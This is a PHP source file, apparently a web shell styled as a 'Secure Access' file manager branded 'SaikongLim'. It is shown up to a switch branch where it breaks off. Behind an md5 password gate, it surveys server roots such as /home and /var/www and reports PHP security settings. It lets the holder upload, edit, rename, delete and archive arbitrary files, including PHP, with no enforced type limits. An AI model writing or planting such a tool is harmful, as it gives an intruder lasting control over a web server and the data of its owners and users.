<?php
session_start();

$stored_hash = "6cebdc80833d65aa1a676aca547be555"; // Ganti dengan hash password Anda

if (!isset($_SESSION['logged_in'])) {
    // Proses login
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        $password = $_POST['password'];
        if (md5($password) === $stored_hash) {
            $_SESSION['logged_in'] = true;
            header("Refresh:0");
            exit();
        }
    }

    // Tampilan login yang keren
    ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Login - Secure Access</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
        body{min-height:100svh;display:flex;justify-content:center;align-items:center;overflow:hidden;background:radial-gradient(circle at center,rgba(0,255,65,.08),transparent 36%),linear-gradient(180deg,#020403,#041108)}
        .container{--ring-size:min(92vmin,520px);--ring-radius:calc(var(--ring-size)/2);--ring-bar-width:clamp(28px,6vmin,42px);--ring-bar-height:clamp(4px,1vmin,7px);--ring-scale:1.55;--panel-width:clamp(250px,70vw,286px);--badge-size:clamp(150px,36vw,188px);position:relative;width:100vw;height:100svh;display:flex;justify-content:center;align-items:center;overflow:hidden;padding:12px}
        .container>span{position:absolute;left:calc(50% - var(--ring-radius));top:50%;width:var(--ring-bar-width);height:var(--ring-bar-height);background:#0d2113;border-radius:999px;transform-origin:var(--ring-radius);transform:translateY(-50%) scale(var(--ring-scale)) rotate(calc(var(--i)*(360deg/50)));animation:blink 3s linear infinite;animation-delay:calc(var(--i)*(3s/50));box-shadow:0 0 8px rgba(0,255,65,.14);z-index:1}
        @keyframes blink{0%{background:#00ff41;box-shadow:0 0 8px #00ff41,0 0 16px #00ff41,0 0 28px rgba(0,255,65,.75)}25%{background:#0d2113;box-shadow:0 0 8px rgba(0,255,65,.14)}}
        .access-box{position:relative;width:min(100%,calc(var(--panel-width) + 20px));z-index:3;display:flex;justify-content:center;align-items:center}
        .access-panel{width:var(--panel-width);padding:clamp(13px,3vmin,18px) clamp(11px,2.8vmin,16px) clamp(12px,2.8vmin,16px);border:1px solid rgba(0,255,65,.22);border-radius:clamp(18px,4vmin,22px);background:linear-gradient(180deg,rgba(0,18,7,.58),rgba(0,0,0,.28)),rgba(0,0,0,.18);box-shadow:0 0 22px rgba(0,255,65,.16),inset 0 0 26px rgba(0,255,65,.06);backdrop-filter:blur(8px);position:relative;overflow:hidden}
        .access-panel:before{content:"";position:absolute;inset:0;background:linear-gradient(120deg,transparent,rgba(0,255,65,.08) 48%,transparent 70%);transform:translateX(-100%);animation:sweep 4s ease-in-out infinite;pointer-events:none}
        .access-panel:after{content:"";position:absolute;inset:0;border-radius:inherit;background:repeating-linear-gradient(to bottom,rgba(0,255,65,.025) 0 1px,transparent 1px 9px);pointer-events:none}
        @keyframes sweep{0%,45%{transform:translateX(-115%)}70%,100%{transform:translateX(115%)}}
        .cyber-badge{position:relative;width:var(--badge-size);height:var(--badge-size);margin:0 auto clamp(10px,2.4vmin,16px);clip-path:polygon(25% 6%,75% 6%,100% 50%,75% 94%,25% 94%,0 50%);background:#00ff41;padding:3px;box-shadow:0 0 16px rgba(0,255,65,.9),0 0 38px rgba(0,255,65,.4);animation:badge 2.8s ease-in-out infinite;z-index:2}
        .cyber-badge-inner{width:100%;height:100%;clip-path:inherit;overflow:hidden;position:relative;background:#031008;display:flex;justify-content:center;align-items:center;padding:clamp(7px,1.8vmin,10px)}
        .cyber-badge-inner img{width:100%;height:100%;object-fit:contain;object-position:center;display:block;background:#031008;filter:contrast(1.03) brightness(1.01) saturate(1.02);transform:scale(.94)}
        .cyber-badge-inner:after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(0,255,65,.04),rgba(0,0,0,.01) 40%,rgba(0,0,0,.08));pointer-events:none}
        .cyber-badge:after{content:"";position:absolute;inset:3px;clip-path:inherit;background:repeating-linear-gradient(to bottom,rgba(0,255,65,.04) 0 1px,transparent 1px 11px);mix-blend-mode:screen;opacity:.28;pointer-events:none;animation:scan 3.2s linear infinite}
        @keyframes badge{0%,100%{transform:scale(1);box-shadow:0 0 16px rgba(0,255,65,.82),0 0 38px rgba(0,255,65,.36)}50%{transform:scale(1.03);box-shadow:0 0 24px rgba(0,255,65,1),0 0 56px rgba(0,255,65,.55)}}
        @keyframes scan{to{background-position:0 80px}}
        #typedtext{position:relative;z-index:2;color:rgba(0,255,65,.95);font-size:clamp(.78rem,2.6vmin,.95rem);font-weight:800;letter-spacing:1.8px;text-transform:uppercase;text-align:center;height:22px;margin:-4px 0 10px;white-space:nowrap;overflow:hidden;border-right:2px solid green;animation:cursorBlink .8s infinite;text-shadow:0 0 8px rgba(0,255,65,.78),0 0 18px rgba(0,255,65,.34)}
        @keyframes cursorBlink{0%,100%{border-color:green}50%{border-color:transparent}}
        .access-title{position:relative;z-index:2;text-align:center;margin-bottom:clamp(8px,2.2vmin,12px);color:rgba(0,255,65,.95);font-size:clamp(.66rem,2.2vmin,.76rem);font-weight:700;letter-spacing:clamp(1.5px,.42vmin,2.3px);text-transform:uppercase;text-shadow:0 0 8px rgba(0,255,65,.75),0 0 18px rgba(0,255,65,.3)}
        form{position:relative;z-index:2;width:100%;max-width:clamp(205px,60vw,238px);display:flex;flex-direction:column;align-items:center;gap:clamp(8px,2vmin,10px);margin:0 auto}
        #loginbox{display:none;position:relative;z-index:2}
        .input-box{position:relative;width:100%}
        .input-box input{width:100%;height:clamp(36px,7.4vmin,40px);padding:0 40px 0 14px;border-radius:12px;border:1.5px solid #194626;outline:none;background:rgba(0,0,0,.46);color:#d9ffe2;font-size:clamp(.82rem,2.45vmin,.9rem);letter-spacing:.3px;transition:.3s;box-shadow:inset 0 0 12px rgba(0,255,65,.05),0 0 10px rgba(0,255,65,.08);backdrop-filter:blur(6px)}
        .input-box input::placeholder{color:rgba(183,255,197,.68)}
        .input-box input:focus{border-color:#00ff41;box-shadow:0 0 12px rgba(0,255,65,.42),inset 0 0 14px rgba(0,255,65,.06)}
        .input-icon{position:absolute;right:13px;top:50%;transform:translateY(-50%);width:17px;height:17px;color:#00ff41;opacity:.78;pointer-events:none;filter:drop-shadow(0 0 6px rgba(0,255,65,.65))}
        .login-submit{width:100%;height:clamp(36px,7.2vmin,39px);border:0;border-radius:12px;background:linear-gradient(180deg,#11ff56,#00d93a);color:#031006;font-size:clamp(.8rem,2.35vmin,.88rem);font-weight:800;letter-spacing:.9px;cursor:pointer;transition:.25s;box-shadow:0 0 14px rgba(0,255,65,.42),0 0 28px rgba(0,255,65,.2);text-transform:uppercase}
        .login-submit:hover{transform:translateY(-1px);box-shadow:0 0 18px rgba(0,255,65,.72),0 0 38px rgba(0,255,65,.32)}
        .system-text{position:relative;z-index:2;margin-top:clamp(8px,2.2vmin,12px);display:flex;justify-content:center;align-items:center;gap:8px;color:rgba(183,255,197,.52);font-size:clamp(.48rem,1.8vmin,.58rem);letter-spacing:clamp(.7px,.25vmin,1.5px);text-transform:uppercase;text-align:center;white-space:nowrap}
        .footer-dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41,0 0 18px rgba(0,255,65,.7);animation:dot 1.4s ease-in-out infinite;flex-shrink:0}
        @keyframes dot{0%,100%{opacity:.5;transform:scale(.85)}50%{opacity:1;transform:scale(1.15)}}
        @media(max-width:520px){.container{--ring-size:min(96vw,96svh,390px);--ring-scale:1.22;--ring-bar-width:28px;--ring-bar-height:6px;--panel-width:min(63vw,238px);--badge-size:min(35vw,132px)}.access-panel{padding:12px 11px;border-radius:18px}.cyber-badge{margin-bottom:9px}#typedtext{font-size:.72rem;margin:-2px 0 8px;letter-spacing:1.2px}.access-title{margin-bottom:8px}form{max-width:min(55vw,214px);gap:8px}.input-box input,.login-submit{height:36px}.input-box input{font-size:.78rem}.login-submit{font-size:.8rem}.system-text{margin-top:8px;font-size:.48rem;letter-spacing:.6px;gap:6px}.footer-dot{width:6px;height:6px}}
        @media(max-width:390px){.container{--ring-size:min(97vw,96svh,370px);--ring-scale:1.16;--ring-bar-width:26px;--panel-width:min(61vw,226px);--badge-size:min(34vw,124px)}.access-panel{padding:11px 10px}#typedtext{font-size:.66rem;letter-spacing:1px}form{max-width:min(54vw,202px)}.input-icon{width:15px;height:15px;right:12px}}
        @media(max-width:330px){.container{--ring-size:min(96vw,94svh,310px);--ring-scale:1.08;--panel-width:205px;--badge-size:106px}form{max-width:182px}#typedtext{font-size:.58rem}.system-text{font-size:.42rem;letter-spacing:.4px}}
        @media(max-height:560px){.container{--ring-size:min(96vw,96svh,350px);--ring-scale:1.12;--panel-width:220px;--badge-size:112px}.access-panel{padding:10px}.cyber-badge{margin-bottom:8px}#typedtext{font-size:.62rem;margin:-2px 0 7px}.access-title{margin-bottom:7px}form{max-width:192px;gap:7px}.input-box input,.login-submit{height:34px}.system-text{margin-top:7px}}
        
        /* Pesan error */
        .error-msg {
            color: #ff4444;
            font-size: 0.75rem;
            margin-top: 5px;
            text-align: center;
            text-shadow: 0 0 10px rgba(255,0,0,0.5);
        }
    </style>
</head>
<body>
<div class="container" id="ring">
  <div class="access-box">
    <div class="access-panel">
      <div class="cyber-badge">
        <div class="cyber-badge-inner">
          <img src="https://bublebeeeee.github.io/piw/saikonglim.png" alt="Secure Access" draggable="false">
        </div>
      </div>

      <div id="typedtext"></div>

      <div id="loginbox">
        <div class="access-title">Access Locked</div>

        <form method="POST">
          <input type="hidden" name="action" value="login">
          <div class="input-box">
            <input type="password" name="password" placeholder="Password" required>
            <svg class="input-icon" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M17 9V7A5 5 0 0 0 7 7v2H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1Zm-8 0V7a3 3 0 0 1 6 0v2H9Zm3 8.75A1.75 1.75 0 1 1 12 14a1.75 1.75 0 0 1 0 3.5Z"/></svg>
          </div>
          <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
          <div class="error-msg">Password salah, coba lagi!</div>
          <?php endif; ?>
          <input type="submit" class="login-submit" value="Login">
        </form>

        <div class="system-text">
          <span class="footer-dot"></span>
          <span>Encrypted Access Required</span>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
// Animasi ring
const ring=document.getElementById("ring");
for(let n=0;n<50;n++){
  const s=document.createElement("span");
  s.style.setProperty("--i",n);
  ring.appendChild(s);
}

// Typing effect
const text = "SaikongLim";
const speed = 20; 
let i = 0;
const typedtext = document.getElementById("typedtext");

function typeWriter() {
    if (i < text.length) {
        typedtext.innerHTML += text.charAt(i);
        i++;
        setTimeout(typeWriter, speed);
    } else {
        document.getElementById("loginbox").style.display = "block";
    }
}

window.onload = function() {
    typeWriter();
};
</script>

</body>
</html>
    <?php
    exit();
}
if (isset($_GET['logout']) && $_GET['logout'] == 1) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}
error_reporting(E_ALL & ~E_NOTICE);

// Configuration - Root Path Options
$possible_roots = array();

// Try to detect possible root directories
$current_script_dir = dirname(__FILE__);
$path_parts = explode('/', $current_script_dir);

// Build possible root paths
for ($i = count($path_parts); $i >= 1; $i--) {
    $test_path = implode('/', array_slice($path_parts, 0, $i));
    if (!empty($test_path) && is_dir($test_path) && is_readable($test_path)) {
        $folder_name = basename($test_path);
        $possible_roots[$test_path] = $folder_name . ' (' . $test_path . ')';
    }
}

// Add some common root directories if they exist
$common_roots = array(
    '/DATA' => 'DATA Root',
    '/home' => 'Home Directory', 
    '/var/www' => 'Web Root',
    '/public_html' => 'Public HTML',
    $_SERVER['DOCUMENT_ROOT'] => 'Document Root'
);

foreach ($common_roots as $path => $label) {
    if (is_dir($path) && is_readable($path) && !isset($possible_roots[$path])) {
        $possible_roots[$path] = $label . ' (' . $path . ')';
    }
}

// Set root path based on user selection or default
if (isset($_GET['set_root']) && isset($possible_roots[$_GET['set_root']])) {
    $_SESSION['fm_root_path'] = $_GET['set_root'];
}

// Get root path from session or use default
if (isset($_SESSION['fm_root_path']) && is_dir($_SESSION['fm_root_path'])) {
    define('FM_ROOT_PATH', $_SESSION['fm_root_path']);
} else {
    // Default to parent of current directory or document root
    $default_root = dirname($current_script_dir);
    if (!is_readable($default_root)) {
        $default_root = $_SERVER['DOCUMENT_ROOT'];
    }
    define('FM_ROOT_PATH', $default_root);
    $_SESSION['fm_root_path'] = $default_root;
}

define('FM_ROOT_URL', 'http://' . $_SERVER['HTTP_HOST']);
define('FM_SELF_URL', $_SERVER['PHP_SELF']);

// Security: Define allowed file extensions
$allowed_extensions = array('txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'htaccess', 'log', 'md', 'sql');
$image_extensions = array('jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp');
$archive_extensions = array('zip', 'tar', 'gz', 'rar');

// Get current directory
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : FM_ROOT_PATH;
$current_dir = realpath($current_dir);

// Security check: prevent directory traversal
if (!$current_dir || strpos($current_dir, FM_ROOT_PATH) !== 0) {
    $current_dir = FM_ROOT_PATH;
}

// Server Information Functions
function get_server_info() {
    global $current_dir;
    $info = array();
    
    // Basic PHP Info
    $info['php'] = array(
        'version' => PHP_VERSION,
        'sapi' => php_sapi_name(),
        'os' => PHP_OS,
        'architecture' => php_uname('m'),
        'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
        'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'Unknown',
        'max_execution_time' => ini_get('max_execution_time'),
        'memory_limit' => ini_get('memory_limit'),
        'post_max_size' => ini_get('post_max_size'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'max_file_uploads' => ini_get('max_file_uploads'),
        'date_timezone' => date_default_timezone_get(),
        'current_time' => date('Y-m-d H:i:s T')
    );
    
    // Extensions
    $info['extensions'] = array(
        'zip' => extension_loaded('zip'),
        'gd' => extension_loaded('gd'),
        'curl' => extension_loaded('curl'),
        'mbstring' => extension_loaded('mbstring'),
        'json' => extension_loaded('json'),
        'openssl' => extension_loaded('openssl'),
        'pdo' => extension_loaded('pdo'),
        'mysqli' => extension_loaded('mysqli'),
        'sqlite3' => extension_loaded('sqlite3'),
        'xml' => extension_loaded('xml'),
        'fileinfo' => extension_loaded('fileinfo'),
        'exif' => extension_loaded('exif'),
        'imagick' => extension_loaded('imagick')
    );
    
    // Disk Space
    $disk_path = $current_dir ? $current_dir : '.';
    $info['disk'] = array(
        'total_space' => disk_total_space($disk_path),
        'free_space' => disk_free_space($disk_path),
        'used_space' => disk_total_space($disk_path) - disk_free_space($disk_path)
    );
    
    // Memory Usage
    $info['memory'] = array(
        'current_usage' => memory_get_usage(true),
        'peak_usage' => memory_get_peak_usage(true),
        'limit' => ini_get('memory_limit')
    );
    
    // File System Capabilities
    $temp_dir = sys_get_temp_dir();
    $upload_tmp_dir = ini_get('upload_tmp_dir');
    if (empty($upload_tmp_dir)) {
        $upload_tmp_dir = $temp_dir;
    }
    
    $open_basedir = ini_get('open_basedir');
    if (empty($open_basedir)) {
        $open_basedir = 'Not set';
    }
    
    $info['filesystem'] = array(
        'current_dir_writable' => is_writable($current_dir ? $current_dir : '.'),
        'current_dir_readable' => is_readable($current_dir ? $current_dir : '.'),
        'temp_dir' => $temp_dir,
        'temp_dir_writable' => is_writable($temp_dir),
        'upload_tmp_dir' => $upload_tmp_dir,
        'open_basedir' => $open_basedir,
        'safe_mode' => (version_compare(PHP_VERSION, '5.4.0') < 0) ? ini_get('safe_mode') : 'Removed in PHP 5.4+'
    );
    
    // Security Settings
    $error_log = ini_get('error_log');
    if (empty($error_log)) {
        $error_log = 'Not set';
    }
    
    $info['security'] = array(
        'allow_url_fopen' => ini_get('allow_url_fopen'),
        'allow_url_include' => ini_get('allow_url_include'),
        'display_errors' => ini_get('display_errors'),
        'log_errors' => ini_get('log_errors'),
        'error_log' => $error_log,
        'expose_php' => ini_get('expose_php'),
        'register_globals' => (version_compare(PHP_VERSION, '5.4.0') < 0) ? ini_get('register_globals') : 'Removed in PHP 5.4+',
        'magic_quotes_gpc' => (version_compare(PHP_VERSION, '5.4.0') < 0) ? ini_get('magic_quotes_gpc') : 'Removed in PHP 5.4+'
    );
    
    // Server Environment
    $info['environment'] = array(
        'server_name' => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'Unknown',
        'server_port' => isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'Unknown',
        'https' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
        'request_method' => isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'Unknown',
        'user_agent' => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown',
        'remote_addr' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown',
        'script_name' => isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : 'Unknown'
    );
    
    return $info;
}

function format_bytes($bytes, $precision = 2) {
    if ($bytes === false || $bytes === null) return 'Unknown';
    
    $units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
    
    for ($i = 0; $bytes > 1024 && $i < count($units) - 1; $i++) {
        $bytes /= 1024;
    }
    
    return round($bytes, $precision) . ' ' . $units[$i];
}

function parse_size($size) {
    $unit = preg_replace('/[^bkmgtpezy]/i', '', $size);
    $size = preg_replace('/[^0-9\.]/', '', $size);
    if ($unit) {
        return round($size * pow(1024, stripos('bkmgtpezy', $unit[0])));
    } else {
        return round($size);
    }
}

// Check if ZipArchive is available
function is_zip_available() {
    return class_exists('ZipArchive');
}

// Alternative zip function using system command
function create_zip_system($source, $destination) {
    if (!is_zip_available()) {
        // Try using system zip command
        $source = escapeshellarg($source);
        $destination = escapeshellarg($destination);
        $command = "cd " . escapeshellarg(dirname($source)) . " && zip -r $destination " . escapeshellarg(basename($source)) . " 2>&1";
        $output = array();
        $return_code = 0;
        exec($command, $output, $return_code);
        return $return_code === 0;
    }
    return false;
}

// Enhanced zip function with better error handling
function create_zip_archive($files, $zip_path, $base_path) {
    if (!is_zip_available()) {
        return array('success' => false, 'error' => 'ZipArchive extension is not available on this server');
    }
    
    $zip = new ZipArchive();
    $result = $zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE);
    
    if ($result !== TRUE) {
        $error_messages = array(
            ZipArchive::ER_OK => 'No error',
            ZipArchive::ER_MULTIDISK => 'Multi-disk zip archives not supported',
            ZipArchive::ER_RENAME => 'Renaming temporary file failed',
            ZipArchive::ER_CLOSE => 'Closing zip archive failed',
            ZipArchive::ER_SEEK => 'Seek error',
            ZipArchive::ER_READ => 'Read error',
            ZipArchive::ER_WRITE => 'Write error',
            ZipArchive::ER_CRC => 'CRC error',
            ZipArchive::ER_ZIPCLOSED => 'Containing zip archive was closed',
            ZipArchive::ER_NOENT => 'No such file',
            ZipArchive::ER_EXISTS => 'File already exists',
            ZipArchive::ER_OPEN => 'Can not open file',
            ZipArchive::ER_TMPOPEN => 'Failure to create temporary file',
            ZipArchive::ER_ZLIB => 'Zlib error',
            ZipArchive::ER_MEMORY => 'Memory allocation failure',
            ZipArchive::ER_CHANGED => 'Entry has been changed',
            ZipArchive::ER_COMPNOTSUPP => 'Compression method not supported',
            ZipArchive::ER_EOF => 'Premature EOF',
            ZipArchive::ER_INVAL => 'Invalid argument',
            ZipArchive::ER_NOZIP => 'Not a zip archive',
            ZipArchive::ER_INTERNAL => 'Internal error',
            ZipArchive::ER_INCONS => 'Zip archive inconsistent',
            ZipArchive::ER_REMOVE => 'Can not remove file',
            ZipArchive::ER_DELETED => 'Entry has been deleted'
        );
        
        $error_msg = isset($error_messages[$result]) ? $error_messages[$result] : 'Unknown error';
        return array('success' => false, 'error' => "Cannot create zip file: $error_msg (Code: $result)");
    }
    
    $added_files = 0;
    
    foreach ($files as $file) {
        $file_path = $base_path . '/' . $file;
        
        if (!file_exists($file_path)) {
            continue;
        }
        
        if (is_dir($file_path)) {
            // Add directory recursively
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($file_path, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                $item_path = $item->getRealPath();
                $relative_path = $file . '/' . substr($item_path, strlen($file_path) + 1);
                
                if ($item->isDir()) {
                    $zip->addEmptyDir($relative_path);
                } else {
                    if ($zip->addFile($item_path, $relative_path)) {
                        $added_files++;
                    }
                }
            }
        } else {
            // Add single file
            if ($zip->addFile($file_path, $file)) {
                $added_files++;
            }
        }
    }
    
    $close_result = $zip->close();
    
    if (!$close_result) {
        return array('success' => false, 'error' => 'Failed to close zip archive');
    }
    
    return array('success' => true, 'files_added' => $added_files);
}

// Handle AJAX requests
if (isset($_GET['ajax']) && $_GET['ajax'] == '1') {
    header('Content-Type: application/json');
    
    $action = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
    $response = array('success' => false, 'message' => '', 'progress' => 0);
    
    try {
        switch ($action) {
            case 'get_server_info':
                $server_info = get_server_info();
                $response['success'] = true;
                $response['data'] = $server_info;
                break;
                
            case 'check_zip_support':
                $response['success'] = true;
                $response['zip_available'] = is_zip_available();
                $response['message'] = is_zip_available() ? 'ZipArchive is available' : 'ZipArchive is not available';
                break;
                
            case 'bulk_delete_progress':
                $selected_files = isset($_POST['selected_files']) ? $_POST['selected_files'] : array();
                $total_files = count($selected_files);
                $deleted_count = 0;
                $errors = array();
                
                foreach ($selected_files as $index => $filename) {
                    if (file_exists($current_dir . '/' . $filename)) {
                        if (is_dir($current_dir . '/' . $filename)) {
                            if (rmdir($current_dir . '/' . $filename)) {
                                $deleted_count++;
                            } else {
                                $errors[] = "Failed to delete folder '$filename' (folder must be empty)";
                            }
                        } else {
                            if (unlink($current_dir . '/' . $filename)) {
                                $deleted_count++;
                            } else {
                                $errors[] = "Failed to delete file '$filename'";
                            }
                        }
                    }
                    
                    // Send progress update
                    $progress = (($index + 1) / $total_files) * 100;
                    if ($index < $total_files - 1) {
                        echo json_encode(array(
                            'success' => true,
                            'progress' => $progress,
                            'current_file' => $filename,
                            'completed' => $index + 1,
                            'total' => $total_files
                        )) . "\n";
                        flush();
                        usleep(100000); // Small delay to show progress
                    }
                }
                
                $response['success'] = true;
                $response['progress'] = 100;
                $response['message'] = "Successfully deleted $deleted_count item(s)";
                if (!empty($errors)) {
                    $response['errors'] = $errors;
                }
                break;
                
            case 'bulk_zip_progress':
                $selected_files = isset($_POST['selected_files']) ? $_POST['selected_files'] : array();
                $zip_name = isset($_POST['zip_name']) ? $_POST['zip_name'] : 'bulk_archive';
                $total_files = count($selected_files);
                
                if (empty($selected_files)) {
                    $response['message'] = 'No files selected';
                    break;
                }
                
                if (!is_zip_available()) {
                    $response['message'] = 'ZipArchive extension is not available on this server. Please contact your hosting provider.';
                    break;
                }
                
                $zip_path = $current_dir . '/' . $zip_name . '.zip';
                
                // Check if we can write to the directory
                if (!is_writable($current_dir)) {
                    $response['message'] = 'Cannot write to directory. Check permissions.';
                    break;
                }
                
                $result = create_zip_archive($selected_files, $zip_path, $current_dir);
                
                if ($result['success']) {
                    $response['success'] = true;
                    $response['progress'] = 100;
                    $response['message'] = "Created bulk archive: $zip_name.zip with " . $result['files_added'] . " file(s)";
                } else {
                    $response['message'] = $result['error'];
                }
                break;

            case 'upload_progress':
                // This would be used for real-time upload progress
                // For now, we'll simulate progress
                $response['success'] = true;
                $response['progress'] = 100;
                $response['message'] = 'Upload completed';
                break;
        }
    } catch (Exception $e) {
        $response['success'] = false;
        $response['message'] = 'Error: ' . $e->getMessage();
    }
    
    echo json_encode($response);
    exit;
}

// Handle regular form submissions
$message = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && !isset($_GET['ajax'])) {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    
    try {
        switch ($action) {
            case 'create_file':
                $filename = isset($_POST['filename']) ? $_POST['filename'] : '';
                if ($filename && !file_exists($current_dir . '/' . $filename)) {
                    if (file_put_contents($current_dir . '/' . $filename, '')) {
                        $message = "File '$filename' created successfully!";
                    } else {
                        $error = "Failed to create file '$filename'";
                    }
                } else {
                    $error = "File already exists or invalid filename";
                }
                break;
                
            case 'create_folder':
                $foldername = isset($_POST['foldername']) ? $_POST['foldername'] : '';
                if ($foldername && !file_exists($current_dir . '/' . $foldername)) {
                    if (mkdir($current_dir . '/' . $foldername, 0755)) {
                        $message = "Folder '$foldername' created successfully!";
                    } else {
                        $error = "Failed to create folder '$foldername'";
                    }
                } else {
                    $error = "Folder already exists or invalid folder name";
                }
                break;
                
            case 'save_file':
                $filename = isset($_POST['filename']) ? $_POST['filename'] : '';
                $content = isset($_POST['content']) ? $_POST['content'] : '';
                if ($filename && file_exists($current_dir . '/' . $filename)) {
                    if (file_put_contents($current_dir . '/' . $filename, $content) !== false) {
                        $message = "File '$filename' saved successfully!";
                    } else {
                        $error = "Failed to save file '$filename'";
                    }
                }
                break;
                
            case 'rename':
                $old_name = isset($_POST['old_name']) ? $_POST['old_name'] : '';
                $new_name = isset($_POST['new_name']) ? $_POST['new_name'] : '';
                if ($old_name && $new_name && file_exists($current_dir . '/' . $old_name)) {
                    if (rename($current_dir . '/' . $old_name, $current_dir . '/' . $new_name)) {
                        $message = "Renamed '$old_name' to '$new_name' successfully!";
                    } else {
                        $error = "Failed to rename '$old_name'";
                    }
                }
                break;
                
            case 'delete':
                $filename = isset($_POST['filename']) ? $_POST['filename'] : '';
                if ($filename && file_exists($current_dir . '/' . $filename)) {
                    if (is_dir($current_dir . '/' . $filename)) {
                        if (rmdir($current_dir . '/' . $filename)) {
                            $message = "Folder '$filename' deleted successfully!";
                        } else {
                            $error = "Failed to delete folder '$filename' (folder must be empty)";
                        }
                    } else {
                        if (unlink($current_dir . '/' . $filename)) {
                            $message = "File '$filename' deleted successfully!";
                        } else {
                            $error = "Failed to delete file '$filename'";
                        }
                    }
                }
                break;
                
            case 'upload':
                $uploaded_files = array();
                $errors = array();
                
                // Handle multiple files upload
                if (isset($_FILES['upload_files']) && is_array($_FILES['upload_files']['name'])) {
                    $file_count = count($_FILES['upload_files']['name']);
                    
                    for ($i = 0; $i < $file_count; $i++) {
                        if ($_FILES['upload_files']['error'][$i] == 0) {
                            $filename = $_FILES['upload_files']['name'][$i];
                            $tmp_name = $_FILES['upload_files']['tmp_name'][$i];
                            $file_size = $_FILES['upload_files']['size'][$i];
                            
                            // Check file size
                            $max_size = parse_size(ini_get('upload_max_filesize'));
                            if ($file_size > $max_size) {
                                $errors[] = "File '$filename' is too large (" . format_bytes($file_size) . " > " . format_bytes($max_size) . ")";
                                continue;
                            }
                            
                            // Handle duplicate filenames
                            $target_path = $current_dir . '/' . $filename;
                            $original_filename = $filename;
                            $counter = 1;
                            
                            while (file_exists($target_path)) {
                                $file_info = pathinfo($original_filename);
                                $name = $file_info['filename'];
                                $ext = isset($file_info['extension']) ? '.' . $file_info['extension'] : '';
                                $filename = $name . '_' . $counter . $ext;
                                $target_path = $current_dir . '/' . $filename;
                                $counter++;
                            }
                            
                            if (move_uploaded_file($tmp_name, $target_path)) {
                                $uploaded_files[] = $filename;
                            } else {
                                $errors[] = "Failed to upload file '$filename'";
                            }
                        } else {
                            $filename = $_FILES['upload_files']['name'][$i];
                            $errors[] = "Upload error for file '$filename': Error code " . $_FILES['upload_files']['error'][$i];
                        }
                    }
                }
                // Handle single file upload (fallback)
                elseif (isset($_FILES['upload_files']) && $_FILES['upload_files']['error'] == 0) {
                    $filename = $_FILES['upload_files']['name'];
                    $tmp_name = $_FILES['upload_files']['tmp_name'];
                    $file_size = $_FILES['upload_files']['size'];
                    
                    $max_size = parse_size(ini_get('upload_max_filesize'));
                    if ($file_size <= $max_size) {
                        $target_path = $current_dir . '/' . $filename;
                        $original_filename = $filename;
                        $counter = 1;
                        
                        while (file_exists($target_path)) {
                            $file_info = pathinfo($original_filename);
                            $name = $file_info['filename'];
                            $ext = isset($file_info['extension']) ? '.' . $file_info['extension'] : '';
                            $filename = $name . '_' . $counter . $ext;
                            $target_path = $current_dir . '/' . $filename;
                            $counter++;
                        }
                        
                        if (move_uploaded_file($tmp_name, $target_path)) {
                            $uploaded_files[] = $filename;
                        } else {
                            $errors[] = "Failed to upload file '$filename'";
                        }
                    } else {
                        $errors[] = "File '$filename' is too large";
                    }
                } else {
                    $errors[] = "No files were uploaded or upload error occurred";
                }
                
                // Set response messages
                if (!empty($uploaded_files)) {
                    $message = "Successfully uploaded " . count($uploaded_files) . " file(s): " . implode(', ', $uploaded_files);
                }
                
                if (!empty($errors)) {
                    $error = implode('<br>', $errors);
                }
                
                if (empty($uploaded_files) && empty($errors)) {
                    $error = "No files were uploaded";
                }
                break;
                
            case 'zip':
                $filename = isset($_POST['filename']) ? $_POST['filename'] : '';
                if (!$filename || !file_exists($current_dir . '/' . $filename)) {
                    $error = "File or folder not found";
                    break;
                }
                
                if (!is_zip_available()) {
                    $error = "ZipArchive extension is not available on this server. Please contact your hosting provider.";
                    break;
                }
                
                if (!is_writable($current_dir)) {
                    $error = "Cannot write to directory. Check permissions.";
                    break;
                }
                
                $zip_path = $current_dir . '/' . $filename . '.zip';
                $result = create_zip_archive(array($filename), $zip_path, $current_dir);
                
                if ($result['success']) {
                    $message = "Created zip file: $filename.zip with " . $result['files_added'] . " file(s)";
                } else {
                    $error = $result['error'];
                }
                break;
                
            case 'unzip':
